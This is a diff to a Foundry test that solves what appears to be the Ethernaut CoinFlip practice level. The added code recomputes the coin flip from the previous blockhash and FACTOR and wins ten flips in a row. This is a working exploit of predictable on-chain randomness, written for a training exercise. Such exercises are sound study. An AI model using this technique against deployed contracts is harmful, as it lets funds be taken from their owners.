@@ -17,5 +17,17 @@ contract CoinFlipLevel is SetUpLevelTest {
         coinFlip = CoinFlip(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        vm.roll(100);
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        for (uint256 i = 0; i < 10; ++i) {
+            emit log_named_uint("block.number", block.number);
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 cFlip = blockValue / FACTOR;
+            bool side = cFlip == 1 ? true : false;
+            assert(coinFlip.flip(side));
+            vm.roll(block.number + 1);
+        }
+        vm.stopPrank();
     }
 }
